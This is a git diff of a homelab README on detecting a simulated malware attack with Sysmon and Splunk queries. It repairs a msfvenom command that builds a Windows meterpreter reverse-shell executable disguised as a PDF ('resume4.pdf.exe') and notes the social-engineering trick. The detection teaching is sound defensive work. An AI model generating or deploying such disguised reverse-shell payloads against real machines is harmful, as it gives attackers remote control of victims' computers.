@@ -20,11 +20,7 @@ This documents a simulated attack using a malicious executable disguised as a PD
 ### 1. Generate the Payload
 On Kali, generate a malicious Windows executable disguised as a PDF:
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104<img width="1916" height="671" alt="homelab4" src="https://github.com/user-attachments/assets/41496a01-9b5d-4bea-b3ac-4c66d71f0a91" />
-<img width="1024" height="670" alt="homelab3" src="https://github.com/user-attachments/assets/f4245e62-2e7f-4a5d-a791-258c09f2b6fb" />
-<img width="1024" height="687" alt="homelab2" src="https://github.com/user-attachments/assets/1a95ad31-f086-4e80-a0ca-cfd1da4b5616" />
-<img width="1024" height="648" alt="Homelab1" src="https://github.com/user-attachments/assets/4416fec7-796e-4e89-8751-130b98462f9b" />
- LPORT=4444 -f exe -o resume4.pdf.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o resume4.pdf.exe
 ```
 The `.pdf.exe` naming is a social engineering technique — it makes the file appear to be a PDF to a casual observer.
 
@@ -78,7 +74,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCod
 - A legitimate PDF file should never spawn a command shell
 - Suspicious parent/child process relationship is a key detection indicator
 
-![Event ID 1 - cmd.exe spawned](screenshots/homelab1.PNG)
+![Event ID 1 - cmd.exe spawned](screenshots/Homelab1.PNG)
 
 ### Event ID 3 - Outbound Network Connection
 **Query:**
